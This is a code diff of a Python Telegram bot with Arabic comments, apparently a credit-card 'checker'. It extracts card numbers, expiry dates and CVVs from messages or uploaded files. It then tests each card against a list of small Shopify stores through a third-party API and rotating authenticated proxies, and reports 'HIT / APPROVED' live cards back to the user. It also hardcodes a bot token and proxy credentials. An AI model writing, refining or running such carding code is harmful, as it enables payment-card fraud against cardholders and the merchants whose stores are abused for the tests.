@@ -5,16 +5,13 @@ import threading
 import random
 from time import sleep
 
+# التوكن الخاص بك (تأكد منه 100%)
 TOKEN = '8558756991:AAHswTBL0ds0QaAaAyBuwvJtTCsNbPRyd5A'
 bot = telebot.TeleBot(TOKEN)
 
-# --- قائمة البروكسيات الدوارة ---
-PROXIES_LIST = [
-    "http://iEN2jEvl:5TqD95Nm664K@proxy.taquito.pp.ua:8080",
-    "socks5h://iEN2jEvl:5TqD95Nm664K@proxy.taquito.pp.ua:10080"
-]
+# حذف أي عملية قديمة معلقة للبوت
+bot.remove_webhook()
 
-# --- قائمة المواقع الضخمة التي أرسلتها ---
 SITES_LIST = [
     "https://mmxhl-2.myshopify.com", "http://makeship.com", "https://shop-caymans.com",
     "https://shop.conequipmentparts.com", "https://sababa-shop.com", "https://mjuniqueclosets.com",
@@ -56,17 +53,26 @@ SITES_LIST = [
     "https://kleanspa-bath-and-body.myshopify.com"
 ]
 
+PROXIES_LIST = [
+    "http://iEN2jEvl:5TqD95Nm664K@proxy.taquito.pp.ua:8080",
+    "socks5h://iEN2jEvl:5TqD95Nm664K@proxy.taquito.pp.ua:10080"
+]
+
+@bot.message_handler(commands=['start'])
+def welcome(m):
+    bot.reply_to(m, "✅ البوت شغال يا مصطفى! أرسل الكومبو أو الملف الآن.")
+
 @bot.message_handler(content_types=['document', 'text'])
-def handle_input(m):
+def handle_all(m):
     if m.content_type == 'text':
-        if m.text.startswith('/start'): return
+        if m.text.startswith('/'): return
         cards = re.findall(r'\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}', m.text)
     else:
         file_info = bot.get_file(m.document.file_id)
         cards = re.findall(r'\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}', bot.download_file(file_info.file_path).decode('utf-8'))
 
     if cards:
-        msg = bot.send_message(m.chat.id, f"🚀 جاري الفحص الذكي لـ {len(cards)} بطاقة...")
+        msg = bot.reply_to(m, f"🚀 تم استلام {len(cards)} بطاقة. جاري الفحص...")
         threading.Thread(target=process_cards, args=(m.chat.id, msg.message_id, cards)).start()
 
 def process_cards(chat_id, msg_id, cards):
@@ -74,25 +80,19 @@ def process_cards(chat_id, msg_id, cards):
     total = len(cards)
 
     for index, card in enumerate(cards, 1):
-        if not SITES_LIST or not PROXIES_LIST:
-            bot.send_message(chat_id, "⚠️ توقفت القوائم (تم حذف جميع المواقع/البروكسيات بسبب أعطال).")
-            break
-
+        if not SITES_LIST: break
         site = random.choice(SITES_LIST)
         proxy = random.choice(PROXIES_LIST)
 
         try:
-            # الفحص بأقل سعر (1.00$) عبر الـ API
-            api_url = f"https://web-production-a8008.up.railway.app/shopify?site={site}&cc={card}&proxy={proxy}&amount=1.00"
+            api_url = f"https://web-production-a8008.up.railway.app/shopify?site={site}&cc={card}&proxy={proxy}"
             res = requests.get(api_url, timeout=20).json()
             
             response_msg = str(res.get("Response", "N/A")).upper()
             status = res.get("Status")
 
-            # تحديث الداشبورد
-            bot.edit_message_text(f"🛰 <b>Kilua Auto-Clean V4</b>\n━━━━━━━━━━━━━━\n💳 <b>CC:</b> <code>{card}</code>\n📊 <b>Progress:</b> {index}/{total}\n✅ <b>Approved:</b> {live}\n❌ <b>Declined:</b> {dead}\n━━━━━━━━━━━━━━\n🌐 <b>Site Count:</b> {len(SITES_LIST)}\n🛰 <b>Proxy Active</b>", chat_id, msg_id, parse_mode="HTML")
+            bot.edit_message_text(f"🛰 <b>Kilua AI V4</b>\n━━━━━━━━━━━━━━\n💳 <b>CC:</b> <code>{card}</code>\n📊 <b>التقدم:</b> {index}/{total}\n✅ <b>Approved:</b> {live}\n❌ <b>Declined:</b> {dead}\n━━━━━━━━━━━━━━\n🌐 <b>مواقع نشطة:</b> {len(SITES_LIST)}", chat_id, msg_id, parse_mode="HTML")
 
-            # معيار النجاح (Approved / Funds / DS / Charged)
             success_keys = ["APPROVED", "SUCCESS", "FUNDS", "CHARGED", "DS_REQUIRED", "AUTHENTICATE"]
             
             if status == True or any(k in response_msg for k in success_keys):
@@ -100,17 +100,12 @@ def process_cards(chat_id, msg_id, cards):
                 bot.send_message(chat_id, f"🎯 <b>HIT / APPROVED</b>\n━━━━━━━━━━━━━━\nCC: <code>{card}</code>\nResponse: {response_msg}\nSite: {site}\n━━━━━━━━━━━━━━\nBy: مصطفى النجم 🇮🇶", parse_mode="HTML")
             else:
                 dead += 1
-                # إذا كان الرد يدل على أن الموقع لا يعمل للفحص، نحذفه لزيادة السرعة
-                if "CONNECTION" in response_msg or "TIMEOUT" in response_msg:
+                if "TIMEOUT" in response_msg or "CONNECTION" in response_msg:
                     SITES_LIST.remove(site)
-
-        except Exception:
+        except:
             dead += 1
-            # حذف البروكسي أو الموقع إذا تسبب في خطأ اتصال متكرر
-            if site in SITES_LIST: SITES_LIST.remove(site)
         
         sleep(1)
 
-    bot.send_message(chat_id, f"🏁 اكتمل العمل!\n✅ حية: {live}\n❌ ميتة: {dead}\n🌐 المواقع المتبقية الشغالة: {len(SITES_LIST)}")
-
+print("--- البوت بدأ العمل الآن بنجاح ---")
 bot.infinity_polling()
